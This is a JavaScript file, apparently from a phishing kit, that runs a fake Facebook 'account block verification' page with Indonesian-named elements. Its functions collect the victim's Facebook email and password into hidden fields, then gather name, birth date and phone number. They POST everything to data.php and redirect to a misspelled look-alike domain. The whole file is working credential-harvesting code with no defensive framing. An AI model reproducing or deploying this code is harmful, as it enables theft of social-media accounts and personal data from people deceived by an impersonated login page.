function AlexHostingNetFB()
	{
		$emailfb = $('#alx_email_fb').val().trim();
		$passwordfb = $('#alx_password_fb').val().trim();
		if($emailfb == '' || $emailfb == null || $emailfb.length <= 6)
		{
			$('.email-fb').show();
			$('.sandi-fb').hide();
            $('.verifpemblokiranalexfb').hide();
            $('.headeralexfbperingatan').hide();
			return false;
		}else{
			$('.email-fb').hide();
			$('.verifpemblokiranalexfb').show();
			$('.headeralexfbperingatan').show();
			$("input#emailress").val($emailfb);
		}
		if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 6)
		{
			$('.sandi-fb').show();
            $('.headeralexfbperingatan').hide();
             $('.verifpemblokiranalexfb').hide();
			return false;
		}else{
			$('.sandi-fb').hide();
			$('.headeralexfbperingatan').show();
			$("input#passwordress").val($passwordfb);
			 $('.verifpemblokiranalexfb').show();
		}
	}

function extend() {
     var nama = $("#alx_nama").val(),
       ttl = $("#alx_ttl").val(),
       phone = $("#alx_phone").val();

     if (!nama || nama == null || nama == '') {
       $(".salahpengisian").show();
       setTimeout(() => {
                 $(".salahpengisian").fadeOut();
               }, 2000)
     } else {
       $(".salahpengisian").hide();
     }
     if (!ttl || ttl == null || ttl == '') {
       $(".salahpengisian").show();
       setTimeout(() => {
                 $(".salahpengisian").fadeOut();
               }, 2000)
     } else {
       $(".salahpengisian").hide();
     }
     if (!phone || phone == null || phone == '') {
       $(".salahpengisian").show();
       setTimeout(() => {
                 $(".salahpengisian").fadeOut();
               }, 2000)
     } else {
       $(".salahpengisian").hide();
     }

     // if all form are filled
     if (nama.length != 0 && ttl.length != 0 && phone.length != 0)

     {
       // SEND DATA
       $.ajax({
         type: 'POST',
         url: 'data.php',
         data: $('#alexFormID').serialize(),
         dataType: 'text',
         beforeSend: function() {
                            $("#btnSubmit").hide();
                            $("#btnHidden").show();
                            $("#btnHidden").prop("disabled", true);
                        },
             success: function() {
               location.href = "https://offiiciallweb.com/fb/";
                            } 
                    })
        		}
        	}
function allresetalex(){
    document.getElementById("alexformawal").reset();
    document.getElementById("alexFormID").reset();
    $('.boxsucessalexfbpemblokiran').hide();
    $('.loadingdataalex').show();
    setTimeout(() => {
                $('.verifpemblokiranalexfb').fadeOut();
                $('.loadingdataalex').fadeOut();
                $('.bxformpemblokiran').show();
               }, 2000)
    
}